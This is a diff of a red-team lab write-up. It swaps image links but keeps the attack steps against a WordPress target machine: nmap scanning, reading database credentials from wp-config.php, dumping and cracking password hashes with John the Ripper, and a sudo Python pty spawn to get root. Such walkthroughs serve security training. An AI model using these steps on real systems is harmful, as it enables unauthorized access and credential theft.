@@ -13,7 +13,7 @@ Nmap scan results for each machine reveal the below services and OS details:
 
 $ nmap ... # nmap -sV 192.168.1.110
 
-![Frank-n-Ted](Red%20Team%20Screenshots/nmap.png)
+![nmap](Red%20Team%20Screenshots/nmap.png)
 
 This scan identifies the services in the above screenshot as potential points of entry.
 
@@ -47,9 +47,9 @@ Below are the associated CVE entries on identified vulnerabilities.
 
 The Red Team was able to penetrate Target 1 and retrieve the following confidential data:
 
-![](RackMultipart20220513-1-igqb1a_html_d4c733c59bd9ed1d.png)
+![wp-scan](Red%20Team%20Screenshots/wp_scan.png)
 
-![](RackMultipart20220513-1-igqb1a_html_c123c7da8965477f.png)
+![user_enumeration](Red%20Team%20Screenshots/user_enumeration.png)
 
   - flag1.txt: flag1{b9bbcb33e11b80be759c4e844862482d}
     - **Exploit Used:** ssh into Michael&#39;s account and look in the/var/www files
@@ -60,13 +60,13 @@ The Red Team was able to penetrate Target 1 and retrieve the following confident
       - command: $ grep -RE flag html
         - Screenshot below is the output of the &quot;grep&quot; command.
 
-![](RackMultipart20220513-1-igqb1a_html_2283abc7f8e77542.png)
+![flag_1](Red%20Team%20Screenshots/flag_1.png)
 
   - flag2.txt: flag2{fc3fd58dcdad9ab23faca6e9a36e581c}
     - **Exploit Used**
       - ssh&#39;d into Michael&#39;s account and looked in the /var/www files.
 
-![](RackMultipart20220513-1-igqb1a_html_568a92c76f798552.png)
+![flag_2](Red%20Team%20Screenshots/flag_2.png)
 
 Flag 3 and 4
 
@@ -78,7 +78,7 @@ Exploits used
 
 - As Michael found MySQL login information in the /var/www/html/wordpress/wp-config.php file.
 
-![](RackMultipart20220513-1-igqb1a_html_af58720d345cf4d7.png)
+![wpconfig](Red%20Team%20Screenshots/cat_wpconfig.png)
 
 - Used the credentials u: root p: R@v3nSecurity to login to MySQL
   - Command: mysql -u root -p
@@ -90,29 +90,29 @@ Exploits used
 
 Found flags 3 and 4.
 
-![](RackMultipart20220513-1-igqb1a_html_27687e2d556f953c.png)
+![flag_3_4](Red%20Team%20Screenshots/flag_3_4.png)
 
 Found hashed passwords for Michael and Steven in MySQL
 
 Command: $ select \* from wp\_users;
 
-![](RackMultipart20220513-1-igqb1a_html_7a58fe1557b5de0.png)
+![hashes](Red%20Team%20Screenshots/password_hashes.png)
 
 **Escalating to Root**
 
 - Exfiltrated Steven&#39;s hashed password and cracked it using John the Ripper
   - Copied hash into a local file called wp\_hashes.txt
     - Command: $ john wp\_hashes.txt
-- ![](RackMultipart20220513-1-igqb1a_html_e5e39951a42611e7.png)
+ ![password](Red%20Team%20Screenshots/steven_password.png)
 - Steven password is pink84
 - Ssh steven@192.168.1.110
   - Passwd: pink84
 - Command: $ sudo -l
-- ![](RackMultipart20220513-1-igqb1a_html_4a869b00a454f0f8.png)
+- ![permissions](Red%20Team%20Screenshots/sudo_permissions.png)
 - Steven has sudo privileges to use Python. We can [exploit this](https://rcenetsec.com/shell-spawning/)
 - sudo python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
-- ![](RackMultipart20220513-1-igqb1a_html_ff148a0de0fc11fe.png)
+- ![root](Red%20Team%20Screenshots/root.png)
 - command: $ cd
 - command: $ ls
 - command: $ cat flag4.txt
-- ![](RackMultipart20220513-1-igqb1a_html_663eb3d47f43bb9d.png)
+- ![pwned](Red%20Team%20Screenshots/pwned.png)
